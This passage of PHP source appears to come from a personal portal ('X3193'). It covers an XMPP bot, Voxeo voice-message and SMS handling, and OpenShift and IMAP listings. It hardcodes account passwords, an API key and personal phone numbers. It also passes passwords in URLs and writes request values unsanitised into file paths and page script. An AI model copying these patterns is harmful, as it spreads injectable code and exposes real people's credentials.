                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "robot.list":
                break;
        case "robot.create":
                break;
        case "robot.modify":
                break;
        case "robot.remove":
                break;
        case "robot.status":
                break;
        case "msg.create":
                break;
        case "msg.send":
                break;
        case "msg.qun.send":
                break;
        case "default":
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=xmpp&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="google">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
                        &nbsp验证码：<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
        default:
                $style = new css();
                
$conn = new XMPP('talk.google.com', 5222, 'wanw.x3193.3322.org@gmail.com', 'EUIfgwe7', 'xmpphp', 'gmail.com', $printlog=True, $loglevel=LOGGING_INFO);
$conn->connect();
while(!$conn->disconnected) {
        $payloads = $conn->processUntil(array('message', 'presence', 'end_stream', 'session_start'));
        foreach($payloads as $event) {
                $pl = $event[1];
                switch($event[0]) {
                        case 'message': 
                                print "---------------------------------------------------------------------------------\n";
                                print "Message from: {$pl['from']}\n";
                                if($pl['subject']) print "Subject: {$pl['subject']}\n";
                                print $pl['body'] . "\n";
                                print "---------------------------------------------------------------------------------\n";
                                $conn->message($pl['from'], $body="Thanks for sending me \"{$pl['body']}\".", $type=$pl['type']);
                                if($pl['body'] == 'quit') $conn->disconnect();
                                if($pl['body'] == 'break') $conn->send("</end>");
                        break;
                        case 'presence':
                                print "Presence: {$pl['from']} [{$pl['show']}] {$pl['status']}\n";
                        break;
                        case 'session_start':
                                $conn->presence($status="Cheese!");
                        break;
                }
        }
}
                
                break;
}
$style->footer();               
}
?>

<?php 
function han2ps($str){
        return Pinyin($str,getcharset(),true,"en");
}

function hanpc2enpc($str){
        $str = str_replace("，",",",$str);       
        $str = str_replace("。",".",$str);       
        $str = str_replace("！","!",$str);       
        $str = str_replace("？","?",$str);       
        $str = str_replace("：",":",$str);       
        $str = str_replace("；",";",$str);       
        $str = str_replace("――","-",$str);       
        $str = str_replace("（","(",$str);       
        $str = str_replace("）",")",$str);       
        $str = str_replace("“","\"",$str);       
        $str = str_replace("”","\"",$str);       
        $str = str_replace("《","<",$str);       
        $str = str_replace("》",">",$str);       
        $str = str_replace("‘","\'",$str);       
        $str = str_replace("’","\'",$str);       
        $str = str_replace("……","...",$str);       
        $str = str_replace("￥","$",$str);  
        return $str;
}

function voxeo(){
header('Content-Type: text/html; charset=utf-8');
header("Cache-Control: no-cache, must-revalidate");
switch (trim(request('action'))) {
        case "voice":
                switch (trim(request('act'))) {                       
                        case "record":
                        ?>
<?php 
echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
?>
<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">
   <form id="record">
   <record name="msg" beep="true" maxtime="1800s" finalsilence="4000ms" type="audio/x-wav" dtmfterm="true">
        <prompt timeout="5s" xml:lang="zh-cn"><?php  echo formatchar("请留言！","utf-8");?></prompt>
        <catch event="nomatch noinput help">
                <reprompt />
        </catch>        
   </record>
   <block>
        <prompt xml:lang="zh-cn"><?php  echo formatchar("您的留言是：","utf-8");?><value expr="msg"/></prompt>
        <prompt xml:lang="zh-cn"><?php  echo formatchar("留言成功！","utf-8");?></prompt>
   </block>
   <var name="callerid" expr="session.callerid"/>
   <var name="calledid" expr="session.telephone.dnis"/>
   <var name="uid" expr="<?php echo time();?>"/>
   <subdialog fetchtimeout="1200s" name="oResult" src="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=message&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" namelist="msg callerid calledid uid" method="post">
        <filled>
                <if cond="oResult.code=='1'">
                        <prompt xml:lang="zh-cn"><value expr="oResult.info"/><?php  echo formatchar("谢谢！","utf-8");?></prompt>
                <else/>
                        <prompt xml:lang="zh-cn"><?php  echo formatchar("对不起！","utf-8");?></prompt><prompt xml:lang="zh-cn"><?php  echo formatchar("请重新留言！","utf-8");?></prompt>
                        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585"/>
        </if>
    </filled>
   </subdialog>
   <block>
        <prompt xml:lang="zh-cn"><?php  echo formatchar("您的留言是！","utf-8");?></prompt>
        <audio expr="'./record/' + callerid + '->' + calledid + '-' + uid + '.wav'"></audio>
        <goto next="#backmenu"/>
   </block>
  </form>
  <form id="backmenu">
        <field name="inputitem">
           <prompt xml:lang="zh-cn"><break time="500ms"/><?php  echo formatchar("返回首页请按星号键，返回上页请按井号键！","utf-8");?></prompt>
      <catch event="nomatch noinput help">
                        <reprompt />
                </catch>
      <grammar mode="voice" root="item1">
       <rule id="item1">
        <one-of>
         <item><?php  echo formatchar("首页","utf-8");?></item>
         <item><?php  echo formatchar("上页","utf-8");?></item>
        </one-of>
       </rule>
      </grammar>
      <grammar mode="dtmf" root="item2">
      <rule id="item2">
       <one-of>
        <item>*</item>
        <item>#</item>
       </one-of>
      </rule>
     </grammar>
     <filled>
        <if cond="inputitem == '*'">
        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=main&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
       <elseif cond="inputitem == '#'"/>
        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
       <else/>
        <prompt><break time="500ms" /></prompt>
      </if>
     </filled>
    </field>
  </form>
</vxml>
<?php 
                                break;                        
                      	case "message": 
																$info = "'".formatchar("语音返回信息","utf-8")."'";
																$code = 1;
                                if (is_uploaded_file($_FILES['msg']['tmp_name'])){
   					 										//$twilio = new twilio_class();
             										//$twilio->twiliosendsms('json','+8615998963077',trim('您有一个新的语音留言，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))),trim('X3193语音留言'));
				      									$voxeo = new voxeo_class();
                  							$voxeo->voxeosendsms('x3193','EUIfgwe7','+8615998963077',trim('您有一个新的语音留言，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))));        
                                	                                                                               	
                                if (copy($_FILES['msg']['tmp_name'], "./record/".trim(request("callerid"))."->".trim(request("calledid"))."-".trim(request("uid")).".wav")){
                 													$vdisk = new vdisk_class();
																					if($vdisk->vdiskupload("xcy6272003@126.com", "EUIfgwe7","./record/".trim(request("callerid"))."->".trim(request("calledid"))."-".trim(request("uid")).".wav","0")){ 
                                								$code = 1;
																								$info = "'".formatchar("语音文件存储与网络备份成功","utf-8")."'";																						
																					}
																					else{
											                          $code = 0;
																								$info = "'".formatchar("语音文件存储与网络备份失败","utf-8")."'";											                          											                          
																					}
                                }
                                else{
                                								$code = 0;
																								$info = "'".formatchar("无法保存","utf-8")."'";	                                								
                                }
                                      
                                } 
                                else{                         	
                                        $code = 0;
																				$info = "'".formatchar("上传失败","utf-8")."'";	                                        
                                }                               

                                echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
                                echo '<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">';
                                echo '<form>';
                                echo '<clear namelist="code info"/>';
                                echo '<var name="code" expr="'.$code.'"/>';
                                echo '<var name="info" expr="'.$info.'"/>';
                                echo '<block>';
                                echo '<return namelist="code info"/>';
                                echo '</block></form></vxml>';
                                break;
                        case "sms":                            
                                break;
                        case "main":
                        ?>
<?php 
echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
?>
<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">
  <form id="topmenu">
        <field name="inputitem">
      <prompt xml:lang="zh-CN" >
        <break time="5s" /><?php  echo formatchar("您好！留言请按一；语音识别请按二","utf-8");?><break time="500ms" />
      </prompt>
      <catch event="nomatch noinput help">
                        <reprompt />
                </catch>
      <grammar mode="voice" root="item1">
       <rule id="item1">
        <one-of>
         <item>1</item>
         <item>2</item>
        </one-of>
       </rule>
      </grammar>
      <grammar mode="dtmf" root="item2">
      <rule id="item2">
       <one-of>
        <item>1</item>
        <item>2</item>        
       </one-of>
      </rule>
     </grammar>
     <filled>
       <if cond="inputitem == '1'">
        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
       <elseif cond="inputitem == '2'"/>
        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
       <else/>
        <prompt><break time="500ms" /></prompt>
      </if>
     </filled>
    </field>
  </form>
        <form id="goodbye">
                <block>
                        <prompt><break time="5s" /></prompt>
                        <prompt xml:lang="zh-CN" ><?php  echo formatchar("再见 ！","utf-8");?>	</prompt>
                        <disconnect/>
                </block>        
        </form>           
</vxml>
<?php 
                                break;
                        case "phonelimiter":
                                $voxeo = new voxeo_class();
                                $code =  $voxeo->voxeoverifycallid(trim(request('callerid')));
                                if ($code !== '1'){
   					 											//$twilio = new twilio_class();
             											//$twilio->twiliosendsms('json','+8615998963077',trim('您有一个新的语音访问点，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))),trim('X3193语音留言'),trim('X3193语音留言模块'));
				      										$voxeo = new voxeo_class();
                  								$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077',trim('您有一个新的语音访问点，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))),trim('X3193语音留言'));        

              							    	$html = new mail_class();
							                  	$html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193有一个新的语音访问点', trim('您有一个新的语音访问点，来自：'.trim(request("callerid")).'来源：'.trim(request("calledid"))),trim('X3193语音留言'),trim('X3193语音留言模块'),'gb2312');
																}
		
                                echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
                                echo '<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">';
                                echo '<form id="topmenu">';
                                echo '<clear namelist="code" />';
                                echo '<var name="code" expr="'.$code.'"/>';
                                echo '<block>';
                                echo '<return namelist="code"/>';
                                echo '</block></form></vxml>';
                                break;
                        default:
                        ?>
<?php 
echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
?>
<vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">
  <form id="topmenu">
   <var name="callerid" expr="session.callerid"/>
   <var name="calledid" expr="session.telephone.dnis"/>
   <var name="uid" expr="<?php echo time();?>"/>
   <subdialog name="oResult" src="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=phonelimiter&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" namelist="callerid calledid uid" method="post">
      <filled>
            <if cond="oResult.code=='1'">
                        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=main&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
            <else/>
            					<prompt xml:lang="zh-CN" >
        								<break time="2s" /><?php  echo formatchar("您好！您暂时无法进入该站点！谢谢！","utf-8");?><break time="500ms" />
      								</prompt>
                      <disconnect/>
            </if>
    </filled>
   </subdialog>
  </form>
</vxml>
<?php 
                                break;
                }       
                break;
        case "sms":  
        				$url = 'http://api.messaging.staging.voxeo.net/1.0/messaging';
								// ToDo: Replace the placeholders in brackets with your data.
								$data="botkey=94491&apimethod=send&msg=".iconv('gb2312','utf-8','['.trim(request('user')).']'.'New essage!')."&user=+8615998963077&network=SMS&from=+12026008419";
								$ch = curl_init();
								curl_setopt($ch, CURLOPT_URL, $url);
								curl_setopt($ch, CURLOPT_HEADER, 0);
								// ToDo: Replace the placeholders in brackets with your data.
								curl_setopt($ch, CURLOPT_USERPWD, 'x3193:EUIfgwe7');
								curl_setopt($ch, CURLOPT_POST, 1);
								curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
								curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
								curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
								$xml = curl_exec($ch);
								if (curl_error($ch)) {
									print "ERROR ". curl_error($ch) ."n<br/>";
								}
								curl_close($ch);
								print_r($xml);        
          
        				$url = 'http://api.messaging.staging.voxeo.net/1.0/messaging';
								// ToDo: Replace the placeholders in brackets with your data.
								$data="botkey=94491&apimethod=send&msg=".iconv('gb2312','utf-8','['.trim(request('user')).']'.trim(request('msg')))."&user=+8615998963077&network=SMS&from=+12026008419";
								$ch = curl_init();
								curl_setopt($ch, CURLOPT_URL, $url);
								curl_setopt($ch, CURLOPT_HEADER, 0);
								// ToDo: Replace the placeholders in brackets with your data.
								curl_setopt($ch, CURLOPT_USERPWD, 'x3193:EUIfgwe7');
								curl_setopt($ch, CURLOPT_POST, 1);
								curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
								curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
								curl_setopt($ch, CURLOPT_TIMEOUT, 100);
								$xml = curl_exec($ch);
								if (curl_error($ch)) {
									print "ERROR ". curl_error($ch) ."n<br/>";
								}
								curl_close($ch);
								print_r($xml);                  
                break;                
        default:
                break;
}
exit;
}
?>


<?php 
function openshift() {
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - IMAP");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

if (0){
        $debug = 1;
}
else{
        $debug = 0;
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "domain.list":
                if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        break;
                                    }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        redirect(scriptpath()."?api=openshift&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("openshift");
}                         

                        $_SESSION["openshift"]=array('uname' => '', 'pwd' => '');                    
                        //session_register("server"); 
                        //$_SESSION["server"] = "";     
                        //session_register("uname"); 
                        //$_SESSION["uname"] = "";      
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        redirect(scriptpath()."?api=openshift&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif ($_SESSION["openshift"]["uname"] != "" && $_SESSION["openshift"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=openshift&skin=".$skincolor."&uname=".encodeuri(trim($_SESSION["openshift"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["openshift"]["pwd"]))."&action=".encodeuri(trim(request("action")))."&page=".encodeuri($page)."&pagesize=".encodeuri($pagesize)."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif (trim(request("uname")) != "" && trim(request("pwd")) != "" && trim($_POST["uname"]) == "" && trim($_POST["pwd"]) == ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("openshift");
} 
                        $_SESSION["openshift"]=array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")));                 
                        //session_register("server"); 
                        //$_SESSION["server"] = trim(request("server"));        
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        //redirect(scriptpath()."?api=openshift&skin=".$skincolor."&pagesize=".encodeuri($pagesize)."&page=1&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        //break;
                }
      
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=openshift&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }  
                $openshift = new openshift_class();
                $domain =  $openshift->openshiftuserdomain($page,$pagesize,base64_Decode($_SESSION["openshift"]["uname"]),base64_Decode($_SESSION["openshift"]["pwd"]));
								//print_r($domain);
                //exit;
                if (is_array($domain)) {
                }       
                else {
                        AlertBack("域名列表输出失败！" , 2);
                        break;
                }
                //return;
                $contents = $domain;              
                if (count($contents['data']) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents['data']);
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.openshift.chidd'+i))
 {
  eval('document.openshift.chidd'+i).checked = document.openshift.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.openshift.action='<?php echo httppath()."?api=openshift&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.openshift.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=openshift&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=openshift&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="openshift" method="post" action="">
                <?php 
                $totalitem = count($contents['data']);
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }       
                //echo $endid;          
                ?>
        <tr class="tdtbg">
                <td align="left">&nbsp;云空间管理 -> <a href="<?php echo ScriptPath()."?api=openshift&action=".encodeuri("domain.list")."&uname=".encodeuri(trim(base64_Decode($_SESSION["openshift"]["uname"])))."&pwd=".encodeuri(trim(base64_Decode($_SESSION["openshift"]["pwd"])))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(base64_decode($_SESSION["openshift"]["uname"]))?></a> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=openshift&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("pwd"))))."&botkey=".encodeuri(trim($botkey))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1"?>" target="_self">退出</a></td>
        </tr>
</table>
                <?php 
                if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                <?php 
                ?>
                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center" width="25%">文件夹</td>
                                <td align="center">容量 - 最新 - 未读</td>
                                <td align="center" width="30%">搜索 创建 删除</td>
                        </tr>
                <?php 
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" /></td>
                                <td align="center"><?php echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=&skin=".$skincolor."'>"."*-".$contents['data'][$i]['userid'].".".$contents['data'][$i]['maindomain']."</a>";?></td>
                                <td align="center"><?php echo (($status->messages=="")?"0":$status->messages).' - '.(($status->recent=="")?"0":$status->recent).' - '.(($status->unseen=="")?"0":$status->unseen);?></td>
                                <td align="center">搜索 添加 删除 配额 更名</td>
                        </tr>
                        <?php 
                }
                ?>
                </table>
            </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "mail.list":
                if ($debug == 1){
                        $mail_count = 1000;
                }
                else{
                        //echo trim(request("mailbox"));
                        $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."}".trim(request("mailbox")), base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                        $mail_count = imap_num_msg($mbox);
                }
                if ($mail_count > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mail_count;
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.ftp.chidd'+i))
 {
  eval('document.ftp.chidd'+i).checked = document.ftp.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.ftp.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
